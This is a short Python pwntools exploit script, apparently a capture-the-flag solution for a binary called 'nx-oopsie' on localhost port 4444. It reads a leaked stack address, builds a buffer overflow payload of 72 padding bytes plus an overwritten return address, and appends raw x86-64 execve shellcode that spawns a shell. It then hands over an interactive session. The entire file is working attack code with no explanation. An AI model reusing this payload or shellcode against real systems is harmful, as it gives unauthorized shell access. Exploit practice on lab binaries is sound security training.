#!/usr/bin/env python3
from pwn import *

exe = ELF("./nx-oopsie")
binary = "./nx-oopsie"
context.binary = exe
#context.log_level = "debug"
IP, PORT = "localhost", 4444

global io
breakpoints = '''
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(binary)
else:
    io = process(binary)
    gdb.attach(io, breakpoints)

s = lambda a: io.send(a)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

reu(": ")
leak = int(rl(),16)
print("Stack Leak:",str(hex(leak)))

payload = ("A"*72).encode()
payload += p64(leak+16)
payload += shellcode

reu("? ")
sl(payload)

io.interactive()